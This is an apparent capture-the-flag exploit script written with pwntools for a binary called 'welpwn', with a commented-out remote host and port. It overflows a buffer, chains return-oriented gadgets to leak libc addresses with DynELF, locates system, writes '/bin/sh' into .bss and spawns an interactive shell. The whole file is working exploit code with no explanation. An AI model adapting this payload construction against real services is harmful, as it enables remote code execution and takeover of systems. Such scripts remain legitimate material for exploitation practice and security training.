#!/usr/bin/env python
from pwn import *
#  p=remote('111.198.29.45',41724)

p = process("welpwn")
elf=ELF('./welpwn')
write_plt=elf.symbols['write']
read_got=elf.got['read']
write_got=elf.got['write']
read_plt=elf.symbols['read']
start_addr=0x0400630
pop4_addr=0x040089c
pop6_addr=0x040089a
mov_addr=0x0400880
def leak(address):
    print p.recv(1024)
    payload1='A'*24+p64(pop4_addr)+p64(pop6_addr)+p64(0)+p64(1)+p64(write_got)+p64(8)+p64(address)+p64(1)+p64(mov_addr)+'A'*56+p64(start_addr)
    payload1=payload1.ljust(1024,'C')
    p.send(payload1)
    data=p.recv(8)
    #print "%x => %s" % (address, (data or '').encode('hex'))
    return data
d=DynELF(leak,elf=ELF('./welpwn'))
sys_addr=d.lookup('system','libc')
print hex(sys_addr)
bss_addr=elf.bss()
prdi_addr=0x04008a3
print p.recv(1024)
payload2='A'*24+p64(pop4_addr)+p64(pop6_addr)+p64(0)+p64(1)+p64(read_got)+p64(8)+p64(bss_addr)+p64(0)+p64(mov_addr)+'A'*56+p64(prdi_addr)+p64(bss_addr)+p64(sys_addr)+'a'*8
payload2=payload2.ljust(1024,'C')
p.send(payload2)
p.sendline('/bin/sh\x00')
p.interactive()
